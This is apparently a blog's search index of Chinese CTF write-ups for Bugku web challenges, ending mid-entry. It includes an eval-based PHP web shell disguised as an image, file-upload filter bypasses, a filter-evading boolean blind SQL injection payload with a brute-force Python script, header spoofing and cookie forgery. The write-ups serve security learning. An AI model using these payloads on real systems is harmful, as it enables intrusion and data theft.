<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>WP-Bugku-求getshell</title>
      <link href="/2018/08/17/Writeup/WP-Bugku-%E6%B1%82getshell/"/>
      <url>/2018/08/17/Writeup/WP-Bugku-%E6%B1%82getshell/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">http://120.24.86.145:8002/web9/</a></p><p>打开后发现  My name is margin,give me a image file not a php</p><p>上传一个php文件不让上传，那么BP抓包</p><p>经过测试，将 Content-Type: 后参数改大写，修改文件名后缀为 .php5 ，文件类型改为图片类型 image/jpg 可以获得flag</p><p><img src="https://i.imgur.com/O2YUor4.png" alt=""></p><p>得到 KEY{bb35dc123820e}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-文件包含2</title>
      <link href="/2018/08/17/Writeup/WP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2/"/>
      <url>/2018/08/17/Writeup/WP-Bugku-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a></p><p>进入题目后发现这个页面，什么都没有<br><img src="https://i.imgur.com/kuzWImF.png" alt=""></p><p>查看源代码</p><p>第一行发现<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://118.89.219.210:49166/index.php?file=upload.php" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=upload.php</a></p><p>出现上传页面<br><img src="https://i.imgur.com/6sbFRtZ.png" alt=""></p><h1 id="CASE-01"><a href="#CASE-01" class="headerlink" title="- CASE 01"></a><font size="10" color="darkViolet">- CASE 01</font></h1><blockquote><font size="4" color="darkred">这种方法是直接利用命令<code>system(&quot;ls&quot;);</code>来查看目录找到flag</font></blockquote><p><br><br>只能上传图片，对大小有限制，那么上传个图片马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> system(<span class="string">"ls"</span>); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>上传后提示：<br><img src="https://i.imgur.com/tr8R2S4.png" alt=""></p><p>那么就访问upload/201808170638381043.jpg<br>构造url<br><a href="http://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=upload/201808170638381043.jpg</a></p><p>发现后台把<code>&lt;?php</code>,<code>?&gt;</code>替换成了<code>_</code>,<code>_</code><br><img src="https://i.imgur.com/UP3KLHo.png" style="float:left;"></p><p><br><br>那么用<code>&lt;script&gt;</code>标签绕过<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">langulage</span>=<span class="string">php</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">system(<span class="string">"ls"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再次上传，并打开文件所在地址</p><p>发现解析成功</p><p>页面出现如下内容<br><img src="https://i.imgur.com/QWjItSt.png" alt=""></p><p>直接访问 this_is_th3_F14g_154f65sd4g35f4d6f43.txt</p><p>构造url:<br><a href="http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt</a></p><p>得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p><hr><h1 id="CASE-02"><a href="#CASE-02" class="headerlink" title="- CASE 02"></a><font size="10" color="darkViolet">- CASE 02</font></h1><blockquote><font size="4" color="darkred">这种方法是上传木马后利用中国菜刀</font></blockquote><p>有了上一次的经验，这里直接：<br>文件名 1.php;.jpg<br>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">echo <span class="string">'aaaa'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'aaaa'</span>]);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上传后访问<br><a href="http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=upload/201808170651501676.jpg</a></p><p>发现成功显示了 aaaa</p><p>那么上菜刀<br><img src="https://i.imgur.com/vQFHaDE.png" alt=""></p><p>连接成功后<br><img src="https://i.imgur.com/fcV6xH2.png" alt=""></p><p>打开tx文件得到 SKCTF{uP104D_1nclud3_426fh8_is_Fun}</p><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 图片马 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-login3(SKCTF)</title>
      <link href="/2018/08/17/Writeup/WP-Bugku-login3-SKCTF/"/>
      <url>/2018/08/17/Writeup/WP-Bugku-login3-SKCTF/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://118.89.219.210:49167/" target="_blank" rel="noopener">http://118.89.219.210:49167/</a></p><p>username输入admin，结果是存在的，返回密码错误</p><p>admin后加上单引号，但是返回是使用者名称不存在</p><p>这意味着什么呢？ 这说明即使语法错误，也不会在页面上显示报错资讯，</p><p>也就不能使用报错注入了，我们发现有两种返回资讯：</p><p>username does not exist!和password error!,那我们可以利用这两个返回值进行布林盲注。</p><p>毕竟我也是第一次接触到这种布林型盲注，也当是小白扫盲吧，怎么利用啰嗦几句。</p><p>我们猜测后台的验证应该是先查询我们输入的使用者名称是否存在，大概是：</p><p>select password,username from users where username=”我们输入的使用者名称”</p><p>如果我们在where语句的结尾加上一个and连线的布林判断语句，就可以根据返回值判断where条件是否成立，比如这道题就可以尝试补成</p><p>where username=’admin’ and (substring(database(),1,1)=’a’)</p><p>如果返回值是password error，那么就说明where语句是成立的，那么我们补充的那就也是成立的，那么就可以确定资料库的第一位是a,然后再猜测第二位。</p><p>但是这道题过滤了and！ ！ ！</p><p>尝试加上and返回：<br>经过尝试发现还过滤了空格，逗号，等号，for</p><p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替</p><p>那怎么办呢，这就用上了今天介绍的异或运算^,先说一下基本规则：</p><p>1^1=0 1^0=1 0^0=0</p><p>就是说只有两个不同的布林值运算结果为1，其他为零</p><p>不过在这里用的时候先不要按这个规则去推，因为在我们用到的三个值的布林运算的sql语句中完全相反，我还没有搞明白，谁懂得话，给我评论下。</p><p>首先说下这里我们要补上两个布林值，这个最后再说为什么。</p><p>先猜资料库名，基本语句</p><p>admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^0#</p><p>解释一下为什么，为了绕过空格过滤，用括号隔开，过滤了等号，用不等号&lt;&gt;代替，只要是布林值就可以。 mid()函式和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx,from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？</p><p>这里用到了ascii()取ascii码值的函式，如果传入一个字串那么就会取第一个字元的字元的ascii码值，这就有了for的作用，并且mid()函式是可以只写from的表示从第几位往后的字串，我们将取出的字串在传入ascii()中取第一位，就完成了对单个字元的提取。</p><p>每个字元的ascii码判断是不是不等于给定的数字，会得到一个布林值(0或1)再与结尾的0进行运算。</p><p>如果资料库名的第一位的ascii码值不是97，where条件是username=’admin’^1^0</p><p>返回值是username does not exist!</p><p>如果资料库名的第一位的ascii码值是97，where条件是username=’admin’^0^0</p><p>返回值会是password error!</p><p>这就构成了布林报错注入。</p><p>有人可能疑问大部分的判断都是无用的，就是说可能从97尝试到120都是username does not exist!，那如何快速找到语句成立时的返回结果(password error!)。 这里就是最后^0的妙用了，</p><p>因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。</p><p>补充一点，因为这里既是语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改不改返回值相同，那就是有语法错误，如果不同就可以参照上一段了。 这也是为什么要多加一个^0,看似多此一举，其实好处多多。</p><p>就是说admin’^(ascii(mid(database()from(1)))&lt;&gt;97)^1# 就可以得到password error!</p><p>资料库名最后可以得到是：blindsql</p><p>下一步猜表名，表名好像没法暴力猜,因为关键词information被禁了！ ！ ！ ！ 那资料库名就没用了，哈哈哈，不过后面猜栏位的值是一样的原理，不亏不亏。</p><p>没法用系统表，就不能像上面一样爆破了，真的是猜了，是admin表，语句如下</p><p>admin’^(select(1)from(admin))^1# 返回password error!说明猜对了</p><p>猜栏位 admin’^(select(count(password))from(admin))^1# 返回password error!说明猜对了。</p><p>为什么要用count()呢，因为如果有多行资料也可能会报错，会干扰判断。</p><p>然后猜password的值，暴力猜解，与猜资料库类似：</p><p>admin’^(ascii(mid((select(password)from(admin))from(1)))&lt;&gt;97)^0#</p><p>得到密码的MD5值:51b7a76d51e70b419f60d3473fb6f900，解密后登陆，得到flag </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests str_all=<span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125; -*/="</span> url=<span class="string">"http://118.89.219.210:49167/index.php"</span> r=requests.session() <span class="function"><span class="keyword">def</span> <span class="title">databasere</span><span class="params">()</span>:</span> resutlt=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): fla = <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod=<span class="string">"admin'^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; s=r.post(url,data) print(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j print(resutlt) <span class="keyword">if</span> fla == <span class="number">0</span>: <span class="keyword">break</span> <span class="function"><span class="keyword">def</span> <span class="title">password</span><span class="params">()</span>:</span> resutlt=<span class="string">""</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>): fla=<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> str_all: playlod = <span class="string">"admin'^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(i <span class="number">1</span>),ord(j)) data = &#123; <span class="string">"username"</span>: playlod, <span class="string">"password"</span>: <span class="string">"123"</span> &#125; s=r.post(url,data) print(playlod) <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">in</span> s.text: resutlt =j fla=<span class="number">1</span> print(<span class="string">'**************************'</span>,resutlt) <span class="keyword">if</span> fla==<span class="number">0</span>: <span class="keyword">break</span> <span class="comment">#databasere() password()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> 基于布尔的SQL盲注 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-细心</title>
      <link href="/2018/08/16/Writeup/WP-Bugku-%E7%BB%86%E5%BF%83/"/>
      <url>/2018/08/16/Writeup/WP-Bugku-%E7%BB%86%E5%BF%83/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">http://120.24.86.145:8002/web13/</a></p><p>进入后发现是一个404错误页面</p><p>参考大佬WP，查看robots.txt</p><p>发现有：<br>User-agent: *<br>Disallow: /resusl.php</p><p>访问/resusl.php后看到<br><code>if ($_GET[x]==$password) 此处省略1w字</code></p><p>那么就要GET传参，</p><p>（看大佬WP传了admin，可能是题目和管理员有关吧…..）</p><p>构造payload<br>?x=admin</p><p>得到flag(ctf_0098_lkji-s)</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-web8</title>
      <link href="/2018/08/16/Writeup/WP-Bugku-web8/"/>
      <url>/2018/08/16/Writeup/WP-Bugku-web8/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/web8/" target="_blank" rel="noopener">http://120.24.86.145:8002/web8/</a></p><p>打开后有源码，代码审计<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$f = trim(file_get_contents($fn));</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($ac === $f)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>可以看出得到flag的途径是ac的值不为空，并且f的值从文件fn中获取，并且ac的值要恒等于f的值</p><p>构造payload<br><code>?ac=flags&amp;fn=flag.txt</code></p><p>得到This is flag: flag{3cfb7a90fc0de31}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Bugku </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-程序员本地网站</title>
      <link href="/2018/08/16/Writeup/WP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/"/>
      <url>/2018/08/16/Writeup/WP-Bugku-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/localhost/" target="_blank" rel="noopener">http://120.24.86.145:8002/localhost/</a></p><p>进入后提示从本地访问</p><p>那么BP抓包</p><p>加上这一行：<br>X-Forwarded-For: 127.0.0.1</p><blockquote><p><a href="https://zh.wikipedia.org/wiki/X-Forwarded-For" target="_blank" rel="noopener"><font color="darkViolet">X-Forwarded-For</font></a>: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。</p></blockquote><p><img src="https://i.imgur.com/JBezurP.png" alt=""></p><p>得到flag{loc-al-h-o-st1}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-flag.php</title>
      <link href="/2018/08/16/Writeup/WP-Bugku-flag.php/"/>
      <url>/2018/08/16/Writeup/WP-Bugku-flag.php/</url>
      <content type="html"><![CDATA[<p>题目地址<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p><p>进入题目后看到的是登录框，题目提示“点了login咋没反应，提示：hint”</p><p>参考网上的WP，</p><p>GET传参，构造后的url：<br><a href="http://120.24.86.145:8002/flagphp/?hint" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/?hint</a></p><p>就得到源码了：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"admin.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"Login"</span> <span class="attr">type</span>=<span class="string">"button"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>意思是当得到 unserialize (反序列化)后的$cookie这个<code>ISecer</code>全等于<code>$KEY</code>后显示 flag<br>这里要注意，<code>$KEY</code>的值并不是<code>$KEY=&#39;ISecer:www.isecer.com&#39;;</code>所显示的，而是<code>&quot;&quot;</code>，即空</p><p>那么php脚本一行：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">print_r(serialize(<span class="string">""</span>));</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>得到结果：<br><code>s:0:&quot;&quot;;</code></p><p>BP抓包Go一下：<br><img src="https://i.imgur.com/A9zaA4d.png" alt=""><br>得到flag{unserialize_by_virink}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Bugku </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-Cookies欺骗</title>
      <link href="/2018/08/14/Writeup/WP-Bugku-Cookies%E6%AC%BA%E9%AA%97/"/>
      <url>/2018/08/14/Writeup/WP-Bugku-Cookies%E6%AC%BA%E9%AA%97/</url>
      <content type="html"><![CDATA[<p>关于python <a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" target="_blank" rel="noopener">requests.Session()</a></p><p>首先看到url上有base64编码<br>解码后是 keys.txt</p><p>url参数line是按行返回<br>参考网上的脚本：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php'</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    payload=&#123;<span class="string">'line'</span>:str(i),<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">    a=s.get(url,params=payload).<span class="attribute">content</span></span><br><span class="line">    <span class="attribute">content</span>=str(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    print(<span class="attribute">content</span>)</span><br></pre></td></tr></table></figure></p><p>得到源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa = file($file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>bp抓包构造包：<br>构造Cookie: margin=margin<br>注意 filename 后的参数 keys.txt 要经过 base64 编码<br><img src="https://i.imgur.com/6SbvPel.png" alt=""></p><p>得到：KEY{key_keys}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
            <tag> Bugku </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python_Requests模块初级使用</title>
      <link href="/2018/08/13/Python-Requests%E6%A8%A1%E5%9D%97%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/08/13/Python-Requests%E6%A8%A1%E5%9D%97%E5%88%9D%E7%BA%A7%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h1><p>先导入Requests模块<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure></p><p>获取某个网页<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">r</span> = requests.get(<span class="string">'url'</span>) #一个名为 r 的 Response 对象</span><br><span class="line"><span class="attr">r</span> = requests.post(<span class="string">'url'</span>,data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;) #发送一个 HTTP POST 请求</span><br><span class="line"><span class="attr">r</span> = requests.put(<span class="string">'url'</span>,data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;) #发送一个 HTTP PUT 请求</span><br><span class="line"><span class="attr">r</span> = requests.delete(<span class="string">'url'</span>) #发送一个 HTTP DELETE 请求</span><br><span class="line"><span class="attr">r</span> = requests.head(<span class="string">'url'</span>) #发送一个 HTTP HEAD 请求</span><br><span class="line"><span class="attr">r</span> = requests.options(<span class="string">'url'</span>) #发送一个 HTTP OPTIONS 请求</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> requests模块 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-这是一个神奇的登陆框</title>
